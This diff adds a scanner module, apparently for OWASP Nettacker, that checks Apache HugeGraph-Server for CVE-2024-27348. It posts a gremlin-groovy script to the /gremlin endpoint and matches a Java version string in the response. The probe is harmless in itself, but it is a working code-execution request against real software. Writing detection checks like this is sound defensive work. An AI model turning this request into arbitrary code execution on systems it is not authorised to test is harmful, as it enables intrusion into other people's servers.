@@ -1,0 +1,56 @@
+info:
+  name: apache_hugegraph_cve_2024_27348_vuln
+  author: Fayzulla Saurov
+  severity: 9
+  description: "CVE-2024-27348 - RCE vulnerability in Apache HugeGraph-Server via Gremlin endpoint. Affects versions 1.0.0 to 1.2.0"
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-27348
+    - https://blog.securelayer7.net/remote-code-execution-in-apache-hugegraph/
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - apache
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 10
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/gremlin"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 8080
+                - 8443
+        data:
+          type: json
+          content:
+            gremlin: 'System.getProperty("java.version")'
+            bindings: "{{}}"
+            language: "gremlin-groovy"
+            aliases: "{{}}"
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: '"code"\s*:\s*200.*"data"\s*:\s*\[.*\d+\.\d+.*\]'
+              reverse: false
